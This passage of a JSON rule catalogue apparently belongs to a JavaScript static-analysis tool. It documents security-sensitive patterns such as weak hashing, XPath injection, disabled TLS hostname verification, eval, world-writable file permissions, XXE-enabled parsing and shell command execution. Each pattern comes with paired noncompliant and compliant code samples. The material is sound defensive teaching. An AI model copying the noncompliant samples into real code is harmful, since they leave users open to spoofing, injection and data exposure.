<a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies\">OWASP best practices</a> when you configure your\ncookies.</p>\n<p>As a side note, every information read from a cookie should be <a\nhref=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitized</a>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === Built-in NodeJS modules ===\nconst http = require('http');\nconst https = require('https');\n\nhttp.createServer(function(req, res) {\n  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive\n});\nhttps.createServer(function(req, res) {\n  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive\n});\n</pre>\n<pre>\n// === ExpressJS ===\nconst express = require('express');\nconst app = express();\napp.use(function(req, res, next) {\n  res.cookie('name', 'John'); // Sensitive\n});\n</pre>\n<pre>\n// === In browser ===\n// Set cookie\ndocument.cookie = \"name=John\"; // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/312\">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE\">COOKIE_USAGE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst crypto = require(\"crypto\");\n\nconst hash = crypto.createHash('sha1'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst crypto = require(\"crypto\");\n\nconst hash = crypto.createHash('sha512'); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S4817": {
        "name": "Executing XPath expressions is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272\">CVE-2016-6272</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149\">CVE-2016-9149</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837\">CVE-2012-4837</a> </li>\n</ul>\n<p>User-provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from\ntainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath\ninjections attacks can read sensitive information from the XML document.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the XPATH expression might contain some unsafe input coming from a user. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize any user input before using it in an XPATH expression.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === Server side ===\n\nvar xpath = require('xpath');\nvar xmldom = require('xmldom');\n\nvar doc = new xmldom.DOMParser().parseFromString(xml);\nvar nodes = xpath.select(userinput, doc); // Sensitive\nvar node = xpath.select1(userinput, doc); // Sensitive\n</pre>\n<pre>\n// === Client side ===\n\n// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:\nvar nodes = document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Sensitive\n\n// Internet Explorer uses its own methods to select nodes:\nvar nodes = xmlDoc.selectNodes(userinput); // Sensitive\nvar node = xmlDoc.SelectSingleNode(userinput); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/643\">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S4818": {
        "name": "Using Sockets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785\">CVE-2011-178</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645\">CVE-2017-5645</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597\">CVE-2018-6597</a> </li>\n</ul>\n<p>Sockets are vulnerable in multiple ways:</p>\n<ul>\n  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive\n  sensitive information or inject dangerous input. </li>\n  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>\n</ul>\n<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the\nuse of http connections.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sockets are created without any limit every time a user performs an action. </li>\n  <li> input received from sockets is used without being sanitized. </li>\n  <li> sensitive data is sent via sockets without being encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>\n  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> any input read from the socket. </li>\n  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst net = require('net');\n\nvar socket = new net.Socket(); // Sensitive\nsocket.connect(80, 'google.com');\n\n// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection\nnet.createConnection({ port: port }, () =&gt; {}); // Sensitive\n\n// net.connect is an alias to net.createConnection\nnet.connect({ port: port }, () =&gt; {}); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption ('Resource Exhaustion')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled by overriding <code>checkServerIdentity</code> with an empty implementation. It is highly recommended to use\nthe original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  checkServerIdentity: function() {}, // Noncompliant\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n});\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst tls = require('node:tls');\n\nlet options = {\n  checkServerIdentity: function() {}, // Noncompliant\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n});\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst tls = require('node:tls');\n\nlet options = {\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n});\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S1523": {
        "name": "Dynamically executing code is security-sensitive",
        "htmlDesc": "<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807\">CVE-2017-9807</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802\">CVE-2017-9802</a> </li>\n</ul>\n<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific\nmeta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a\nhref=\"https://owasp.org/www-community/attacks/Code_Injection\">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:\nXSS attack) and have a huge impact on an application’s security.</p>\n<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This rule does not detect code injections. It only\nhighlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>\n<p>The rule also flags string literals starting with <code>javascript:</code> as the code passed in <code>javascript:</code> URLs is evaluated the\nsame way as calls to <code>eval</code> or <code>Function</code> constructor.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>\n  <li> you really need to run code dynamically. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the\ncode in a <a href=\"https://en.wikipedia.org/wiki/Sandbox_(computer_security)\">sandboxed</a> environment. Use jails, firewalls and whatever means your\noperating system and programming language provide (example: <a\nhref=\"https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager\">Security Managers</a> in java, <a\nhref=\"https://www.w3schools.com/tags/att_iframe_sandbox.asp\">iframes</a> and <a href=\"https://en.wikipedia.org/wiki/Same-origin_policy\">same-origin\npolicy</a> for javascript in a web browser).</p>\n<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>\n<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nlet value = eval('obj.' + propName); // Sensitive\nlet func = Function('obj' + propName); // Sensitive\nlocation.href = 'javascript:void(0)'; // Sensitive\n</pre>\n<h2>Exceptions</h2>\n<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably\nsafe.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S1525": {
        "name": "Debugger statements should not be used",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS4507'>S4507</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint\nin the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to\nattacks in production.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfor (i = 1; i&lt;5; i++) {\n  // Print i to the Output window.\n  Debug.write(\"loop index is \" + i);\n  // Wait for user to resume.\n  debugger;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfor (i = 1; i&lt;5; i++) {\n  // Print i to the Output window.\n  Debug.write(\"loop index is \" + i);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>Node.js <a href=\"https://nodejs.org/api/fs.html\"><code>fs</code></a></p>\n<pre>\nconst fs = require('fs');\n\nfs.chmodSync(\"/tmp/fs\", 0o777); // Sensitive\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises;\n\nfsPromises.chmod(\"/tmp/fsPromises\", 0o777); // Sensitive\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises\n\nasync function fileHandler() {\n  let filehandle;\n  try {\n    filehandle = fsPromises.open('/tmp/fsPromises', 'r');\n    filehandle.chmod(0o777); // Sensitive\n  } finally {\n    if (filehandle !== undefined)\n      filehandle.close();\n  }\n}\n</pre>\n<p>Node.js <a href=\"https://nodejs.org/api/process.html#process_process_umask_mask\"><code>process.umask</code></a></p>\n<pre>\nconst process = require('process');\n\nprocess.umask(0o000); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Node.js <a href=\"https://nodejs.org/api/fs.html\"><code>fs</code></a></p>\n<pre>\nconst fs = require('fs');\n\nfs.chmodSync(\"/tmp/fs\", 0o770); // Compliant\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises;\n\nfsPromises.chmod(\"/tmp/fsPromises\", 0o770); // Compliant\n</pre>\n<pre>\nconst fs = require('fs');\nconst fsPromises = fs.promises\n\nasync function fileHandler() {\n  let filehandle;\n  try {\n    filehandle = fsPromises.open('/tmp/fsPromises', 'r');\n    filehandle.chmod(0o770); // Compliant\n  } finally {\n    if (filehandle !== undefined)\n      filehandle.close();\n  }\n}\n</pre>\n<p>Node.js <a href=\"https://nodejs.org/api/process.html#process_process_umask_mask\"><code>process.umask</code></a></p>\n<pre>\nconst process = require('process');\n\nprocess.umask(0o007); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in libxmljs</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvar libxmljs = require('libxmljs');\nvar fs = require('fs');\n\nvar xml = fs.readFileSync('xxe.xml', 'utf8');\nlibxmljs.parseXmlString(xml, {\n    noblanks: true,\n    noent: true, // Noncompliant\n    nocdata: true\n});\n</pre>\n<h4>Compliant solution</h4>\n<p><code>parseXmlString</code> is safe by default.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvar libxmljs = require('libxmljs');\nvar fs = require('fs');\n\nvar xml = fs.readFileSync('xxe.xml', 'utf8');\nlibxmljs.parseXmlString(xml);\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S4721": {
        "name": "Using shell interpreter when executing OS commands is security-sensitive",
        "htmlDesc": "<p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be\nused (when parameters are user-controlled for instance) to inject OS commands.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> OS command name or parameters are user-controlled. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use functions that don’t spawn a shell.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst cp = require('child_process');\n\n// A shell will be spawn in these following cases:\ncp.exec(cmd); // Sensitive\ncp.execSync(cmd); // Sensitive\n\ncp.spawn(cmd, { shell: true }); // Sensitive\ncp.spawnSync(cmd, { shell: true }); // Sensitive\ncp.execFile(cmd, { shell: true }); // Sensitive\ncp.execFileSync(cmd, { shell: true }); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst cp = require('child_process');\n\ncp.spawnSync(\"/usr/bin/file.exe\", { shell: false }); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nip = \"192.168.12.42\"; // Sensitive\n\nconst net = require('net');\nvar client = new net.Socket();\nclient.connect(80, ip, function() {\n  // ...\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nip = process.env.IP_ADDRESS; // Compliant\n\nconst net = require('net');\nvar client = new net.Socket();\nclient.connect(80, ip, function() {\n  // ...\n});\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non routable address 0.0.0.0 </li>\n  <li> Strings of the form 